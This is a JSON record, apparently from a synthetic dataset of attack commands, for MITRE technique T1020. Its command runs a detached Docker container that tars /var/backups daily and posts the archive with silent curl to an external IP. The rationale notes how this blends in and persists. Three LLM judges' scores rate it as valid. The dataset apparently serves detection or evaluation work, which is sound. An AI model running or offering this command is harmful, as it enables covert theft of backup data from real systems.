@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_backups --network host -e HN=$(hostname) -v /var/backups:/data:ro curlimages/curl:8.8.0 sh -c 'while true; do TS=$(date +%s); tar -C /data -cz . | curl -s -H \"Content-Type: application/octet-stream\" --data-binary @- \"https://203.0.113.15/ingest/$HN/backups_$TS.tgz\"; sleep 86400; done'",
+  "explanation": "Exfiltrates /var/backups once per day via HTTPS with minimal output, running continuously in the background.",
+  "rationale_steps": [
+    "Accesses backups through a read-only bind mount",
+    "Automates daily transfer using a long sleep interval",
+    "Uses HTTPS and silent curl to blend in and reduce noise",
+    "Detached container provides persistence without host changes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-f12262af",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Docker and shell syntax with balanced quoting, valid flags, and proper command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements automated HTTPS exfiltration of /var/backups via tar piped to curl in a detached loop, though success depends on the container having tar, sufficient read permissions, and the target IP being reachable.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T05:00:09.494687Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed with balanced quotes and valid flags, though the shell -c string passed to Docker has a subtle issue: the environment variable HN is set via -e at Docker run time but expanded in the host shell before being passed, meaning the inner shell script references $HN correctly only if it's exported into the container environment, which works here since -e HN=$(hostname) sets it as a container env var accessible to the inner sh -c script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1020 automated exfiltration by mounting /var/backups read-only, compressing its contents with tar, streaming the archive via HTTPS POST to an external IP with a timestamped filename, running in a detached background container with a 24-hour loop — fully consistent with automated, scheduled, compressed exfiltration over HTTPS.",
+        "combined_score": 4.5,
+        "confidence": 0.92,
+        "timestamp": "2026-02-18T22:28:38.238518Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct shell syntax for variables, subshells, pipes, and loops, alongside valid Docker and tool-specific flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command aligns perfectly with T1020 by automating the compression (tar), scheduling (while loop/sleep), and exfiltration (curl) of data from a sensitive directory (/var/backups) using a plausible containerized approach.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:28:49.491410Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
